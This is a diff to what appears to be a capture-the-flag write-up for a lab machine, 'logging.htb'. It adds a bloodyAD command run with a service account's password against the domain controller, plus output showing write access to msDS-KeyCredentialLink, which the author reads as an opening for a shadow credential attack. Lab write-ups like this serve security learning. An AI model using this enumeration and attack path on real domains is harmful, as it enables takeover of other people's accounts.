@@ -279,6 +279,10 @@ This user also has GenericWrite on the `msa_health$` user
 After checking the exact attributes i have write on using bloodyAD i see the key credential link attribute which means i can do a shadow credential attack
 
 ```python
+❯❯❯ bloodyAD --host dc01.logging.htb -d logging.htb -u 'svc_recovery' -p 'Em3rg3ncyPa$$2026' -k get writable --detail
+
 distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
-...[]...
+...[SNIP]...
+msDS-KeyCredentialLink: WRITE
 ```
+
